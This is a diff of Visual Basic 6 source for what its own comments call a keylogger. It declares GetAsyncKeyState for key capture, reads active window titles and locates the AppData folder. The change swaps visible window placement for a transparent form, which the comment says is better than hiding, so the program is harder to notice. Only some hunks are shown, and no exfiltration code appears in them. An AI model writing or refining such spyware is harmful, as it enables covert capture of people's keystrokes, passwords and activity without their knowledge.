@@ -1,47 +1,47 @@
 VERSION 5.00
 Begin VB.Form Form1 
    BorderStyle     =   0  'None
-   ClientHeight    =   0
+   ClientHeight    =   510
    ClientLeft      =   0
    ClientTop       =   0
-   ClientWidth     =   15
+   ClientWidth     =   735
    ClipControls    =   0   'False
    ControlBox      =   0   'False
    Icon            =   "Form1.frx":0000
    LinkTopic       =   "Form1"
    MaxButton       =   0   'False
    MinButton       =   0   'False
-   ScaleHeight     =   0
+   ScaleHeight     =   34
    ScaleMode       =   3  'Pixel
-   ScaleWidth      =   1
+   ScaleWidth      =   49
    ShowInTaskbar   =   0   'False
    Begin VB.Timer Timer1 
       Enabled         =   0   'False
       Interval        =   60
-      Left            =   3120
-      Top             =   600
+      Left            =   3840
+      Top             =   960
    End
    Begin VB.Timer Timer2 
       Interval        =   450
-      Left            =   3360
-      Top             =   0
+      Left            =   3120
+      Top             =   600
    End
    Begin VB.TextBox Text2 
       Enabled         =   0   'False
       Height          =   285
-      Left            =   240
+      Left            =   480
       Locked          =   -1  'True
       TabIndex        =   1
-      Top             =   120
+      Top             =   840
       Width           =   2775
    End
    Begin VB.TextBox Text1 
       Enabled         =   0   'False
       Height          =   1935
-      Left            =   120
+      Left            =   480
       MultiLine       =   -1  'True
       TabIndex        =   0
-      Top             =   480
+      Top             =   1080
       Width           =   3735
    End
 End
@@ -57,14 +57,14 @@ Public Enum mceIDLPaths
     CSIDL_APPDATA = &H1A ' C:\WINNT\Profiles\username\Application Data.
     CSIDL_WINDOWS = &H24 ' C:\WINNT.
 End Enum
-Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hWnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
+Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hwnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
 Dim AppDataPath As String
 
 'Active windowtitle part
 Private Declare Function GetForegroundWindow Lib "user32" () As Long
-Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
-Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
-Private Declare Function GetParent Lib "user32" (ByVal hWnd As Long) As Long
+Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
+Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
+Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
 
 'keylogger part
 Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
@@ -87,8 +87,7 @@ If App.PrevInstance = True Then
     Exit Sub
 End If
 
-Me.Left = Screen.Width - Me.Width
-Me.Top = Screen.Height - Me.Height
+TransparentForm Me                  ''Rather than me.hide its better to become transparent.
 
 AppDataPath = GetSpecialFolderA(CSIDL_APPDATA)
 
@@ -462,14 +461,14 @@ End If
 
 GetActiveWindowTitle = GetWindowTitle(i)
 End Function
-Public Function GetWindowTitle(ByVal hWnd As Long) As String
+Public Function GetWindowTitle(ByVal hwnd As Long) As String
 Dim l As Long
 Dim S As String
 
-l = GetWindowTextLength(hWnd)
+l = GetWindowTextLength(hwnd)
 S = Space(l + 1)
 
-GetWindowText hWnd, S, l + 1
+GetWindowText hwnd, S, l + 1
 
 GetWindowTitle = Left$(S, l)
 End Function
